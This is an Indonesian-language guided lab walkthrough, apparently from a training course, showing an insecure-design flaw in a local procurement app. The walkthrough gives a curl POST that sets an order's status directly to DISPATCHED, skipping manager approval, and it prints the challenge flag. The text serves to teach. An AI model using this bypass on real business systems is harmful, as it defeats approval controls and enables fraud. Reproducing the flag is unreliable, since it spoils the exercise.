# Panduan Praktik Terbimbing: Audit Insecure Design pada Zitera Procurement

Dalam latihan terarah ini, kamu akan mempraktikkan proses pembuktian cacat desain alur logika bisnis pada sistem pengadaan barang korporasi **Zitera Procurement Workflow (Corporate Enterprise Procurement)** yang beroperasi pada `http://127.0.0.1:8016`.

---

### Langkah 1: Observasi Antarmuka & Uji Ketersediaan Layanan
1. Uji ketersediaan layanan melalui terminal:
   ```bash
   curl -s http://127.0.0.1:8016/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"lab":"A06","port":8016,"status":"ok"}
   ```
2. Buka peramban web dan akses halaman beranda portal:
   `http://127.0.0.1:8016/`
3. Perhatikan tabel **Active Procurement Orders & Requisitions**:
   - Order `#1001`: Developer Cloud Sandbox ($120.00) — status `DRAFT` (auto-approve karena < $500).
   - Order `#1002`: AI & GPU Cluster Access ($15,000.00) — status `PENDING_REVIEW`.
   - Order `#9999`: **Executive Tier-0 Datacenter Infrastructure Clearance** ($50,000.00) milik `learner` — status `DRAFT`.
4. Evaluasi aturan kebijakan bisnis:
   - Pesanan bernilai $\ge \$500$ dirancang secara ketat membutuhkan tanda tangan dan persetujuan manajer eksekutif sebelum barang dapat dikirimkan (*DISPATCHED*).

---

### Langkah 2: Pemetaan API Endpoint & Struktur Request
1. Periksa alur transisi status melalui inspeksi DevTools atau periksa daftar pesanan via API:
   ```bash
   curl -s http://127.0.0.1:8016/api/orders
   ```
2. Perhatikan dokumentasi endpoint transisi alur kerja:
   - **Method:** `POST`
   - **Endpoint:** `/api/orders/<id>/transition`
   - **Payload Format:** JSON `{"target_state": "<NAMA_STATUS>"}`
3. **Analisis Cacat Desain:**
   API backend menerima nama status target langsung dari permintaan klien, bukan menghitungnya berdasarkan aturan bisnis di sisi server!

---

### Langkah 3: Melakukan Lompatan Status Langsung (State Leapfrog)
1. Kirimkan permintaan modifikasi status pada Order bernilai $50,000 (`#9999`) langsung dari status `DRAFT` melompat ke status akhir `DISPATCHED`:
   ```bash
   curl -s -X POST http://127.0.0.1:8016/api/orders/9999/transition \
     -H "Content-Type: application/json" \
     -d '{"target_state": "DISPATCHED"}'
   ```
2. **Temuan Kritis & Respons Server:**
   ```json
   {
     "message": "Order 9999 transitioned to DISPATCHED",
     "order": {
       "amount": 50000,
       "id": "9999",
       "item": "Executive Tier-0 Datacenter Infrastructure Clearance",
       "owner": "learner",
       "status": "DISPATCHED"
     },
     "flag": "ZITERA{1n53cur3_d351gn_fl4w3d_w0rkfl0w}"
   }
   ```
   Alur persetujuan manajer dan kliring keuangan berhasil dilompati 100%!

> [!NOTE]
> [!NOTE]
> **Di Balik Layar: Mengapa State Machine ini cacat?**  
> Backend menyimpan status pesanan dalam memori atau database, namun fungsi handler mengeksekusi:  
> `order.status = payload["target_state"]`  
> Server tidak memiliki tabel validasi transisi sah (misal: `DRAFT` hanya boleh pindah ke `PENDING_REVIEW`). Akibatnya, klien bebas melompat ke status akhir apapun!

---

### Langkah 4: Verifikasi Penyelesaian Praktik & Pengiriman Flag
1. Ujilah verifikasi otomatis sasaran lab melalui endpoint:
   ```bash
   curl -s http://127.0.0.1:8016/practice/verify
   ```
   *Konfirmasi verifikasi:*
   ```json
   {
     "status": "completed",
     "message": "Objective verified! Order 9999 successfully transitioned to DISPATCHED bypassing approval workflow."
   }
   ```
2. Muat ulang halaman peramban web pada `http://127.0.0.1:8016/` dan amati bahwa Order `#9999` telah berstatus `DISPATCHED` dengan badge hijau menyala.
3. Salin bendera autoritatif:
   `ZITERA{1n53cur3_d351gn_fl4w3d_w0rkfl0w}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
